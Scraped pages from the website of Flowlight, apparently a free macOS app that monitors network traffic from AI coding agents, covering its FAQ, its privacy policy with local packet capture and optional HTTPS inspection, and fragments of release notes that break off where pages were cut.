 Desktop, Cursor, Windsurf, VS Code, Codex, Zed and Gemini CLI configs. It can't see which individual tool call inside a
 long-running server opened a connection.

 Does an allowlist block traffic?

 Not yet. A violation raises a critical alert and marks the destination "Not allowed". Blocking needs the Network
 Extension engine and is on the roadmap.

 Which agents does it recognize?

 Claude Code, Codex, Cursor, Windsurf, GitHub Copilot, Gemini CLI, Aider, Goose, OpenCode, Ollama, LM Studio,
 ChatGPT, Claude, Zed, Perplexity and ZCode, plus any non-browser process that calls a known LLM API. Adding one is a
 one-line pull request.

 How does it update?

 Once a day Flowlight asks GitHub for the latest release. When there's one, it shows the notes and can download the
 disk image, verify it against the published SHA-256 and open it. You can turn the check off in Settings.

 Is it really free?

 Yes. It's free software under the GPL-3.0: no paid tier, no data collection.

 Know what leaves your Mac.

 Free software for macOS 15 and later.

 Download for macOS
 View source
 brew install --cask xinbetween/tap/flowlightCopy

# Flowlight privacy
URL: https://flowlight.xinbetween.com/privacy/

Privacy

 Your traffic stays on your Mac

 Flowlight has no account, no server and no analytics. This page lists everything it records and every request it makes,
 so you can check the claims against the source.

 On this page
 In shortWhat it recordsPacket captureRead locallyHTTPS inspection
 Network requestsPermissionsRetention
 This websiteContact

 In short

 Flowlight records network metadata (which app, which host, which port, how many bytes, when) in a database on your Mac.

 It never records packet contents and never decrypts traffic, unless you turn on the optional HTTPS inspection for apps you route through it.

 Nothing you record is ever sent anywhere. There is no telemetry, crash reporting or analytics.

 The app makes a few network requests of its own, listed below, and you can turn off each optional one.

 What it records

 For each second: the app (bundle ID, name, executable path, process ID), the remote IP address, hostname, port, transport and
 protocol, and bytes sent and received. It also stores the alerts it raises and per-app baselines used by the anomaly rules.
 All of it lives in ~/Library/Application Support/Flowlight.

 Packet capture

 If you approve the one-time hostname setup, Flowlight reads packets on your primary network interface through a kernel filter that
 passes only two things: DNS responses, and the first message of a TLS connection (the ClientHello). From those it keeps only
 hostnames and the addresses they map to, in memory. Everything else is dropped in the kernel, and no packet is written to disk.

 What it reads on your Mac

 To attribute an agent's tools and MCP servers, Flowlight reads each process's parent and command line from macOS, and the MCP
 configuration files of the agents it supports (for example ~/.claude.json, ~/.cursor/mcp.json and
 ~/.codex/config.toml). It keeps only each server's name, launch command and URL, in memory, and stores only the resulting
 labels ("via curl", "github MCP") with your traffic. Nothing from these files or command lines is sent anywhere.

 HTTPS inspection

 Off by default. If you turn it on, Flowlight creates a certificate authority on your Mac (its key never leaves
 ~/Library/Application Support/Flowlight/Inspection) and runs a proxy that accepts connections only from this Mac. For apps you
 route through it, it records requests and responses, including bodies up to 2 MB, in the local database for 3 days. Credential headers
 (Authorization, cookies, API keys) are replaced with their length before anything is stored. Apple services and password managers are
 never decrypted. Nothing recorded is sent anywhere. Turning inspection off stops the proxy; Remove Certificate & Recorded
 Data deletes the certificate, its trust setting and every recorded request.

 Network requests the app makes

 RequestSent toWhat it containsWhen

 Update checkapi.github.comA standard HTTPS request for the latest release; GitHub sees your IP address and the Flowlight/<version> user agentOn launch and daily, from 0.1.2. Off switch in Settings › General

 Update downloadgithub.comThe disk image and its checksum fileOnly when you click Download & Open

 Reverse DNSYour configured DNS resolverA lookup of an IP address's registered name, when no hostname was seenAs needed, in the default capture mode

 Network owner lookupTeam Cymru, over DNSPublic IP addresses with no known hostname. Private and reserved addresses never leave your MacOn by default. Off switch in Capture › Identify network owners

 Permissions

 Administrator password, once, for packet-capture access. Removable from the Capture screen.

 Notifications, for warnings. Optional.

 Login item, only if you turn on Launch at login.

 Retention

 Per-second data 6 hours (adjustable), minute data 14 days, hourly data 400 days, daily totals indefinitely, alerts 90 days.
 Capture › Clear all data deletes everything, and removing ~/Library/Application Support/Flowlight does the same.

 This website

 This site is a static page hosted on GitHub Pages and served through Cloudflare. It sets no cookies and runs no analytics. GitHub
 and Cloudflare process requests to serve it, and the fonts load from Google Fonts, which receives your IP address when you visit.

 Contact

 Questions or a privacy concern? Open an issue. For anything sensitive, use GitHub's
 private vulnerability reporting on the repository.

---

 You can see what will leave before it does: the panel lists every field and previews a real payload built
 from your own data. Nothing from HTTPS inspection can be exported — the payload types have nowhere to put a header or body.

 Auth headers live in the Keychain, and what Flowlight sends appears in Live and Reports like any other app's traffic.

 was answered by Flowlight rather than the host. Active rules show as a count, so one left on doesn't cost you an afternoon.

 An allowlist can refuse, not only warn. Turn on Refuse connections outside the list for an agent and

 Off for lists you already have. A tool you leave running shouldn't change what it does to your network
 because you installed an update.

 Never refused: your local network, DNS, Apple's services and Flowlight's own traffic — and enforcement
 lapses a few seconds after Flowlight stops running, because a refusal nobody can see is worse than none.

 Needs the Network Extension; the sampler can only watch. How it works →

 It's Worth a look, not Suspicious: the data supports "unusual next to the other apps here", and a backup

 0.2.6
September 24, 2026

 Flowlight says when macOS won't let its filter run. macOS allows one content filter at a time, and on a
 managed Mac a VPN or security agent usually holds it. Flowlight's filter would install, activate and connect while never being
 handed a single connection — looking healthy and recording nothing. Capture now lists the other filters by name and offers the
 sampler, which needs no filter.

 Fixed: switching to the extension showed an empty Live panel, because it replayed up to an hour of buffered
 traffic oldest-first before anything current could get through.

 "Connected" no longer implies "working" — the status distinguishes a live connection from one that is
 actually being given traffic.

 A diagnostic script for when capture misbehaves, reporting state and counts and nothing about your traffic.

 0.2.5
September 24, 2026

 Fixed: the filter stopped working after every app update. macOS keeps running whichever build of the
 extension was last activated, so after an update it was the previous one — and a mismatched pair can't talk to each other.
 Capture reported the extension as unreachable while it sat there installed and enabled. Flowlight now checks the installed
 version at launch and re-activates the filter itself.

 Fixed: a working extension could report itself unreachable indefinitely, because a superseded connection's
 failure overwrote the status of the one in use.

 Fixed: the status went amber whenever the network was quiet, since the extension only sends when there is
 traffic.

 Capture explains what each engine can miss — the sampler loses whole short connections, not bytes.

 running could beachball the app for minutes, waiting on the packet-capture device to close. Found from a user's hang report.

 Inspect says when it isn't working. Turning inspection on used to report success as soon as the commands ran,
 so a proxy that never came up looked the same as one that did. Flowlight now checks that it's listening, that your network
 services point at it, and that its settings file is served — and names whichever isn't true.

 only appears in a payload now finds its exchange.
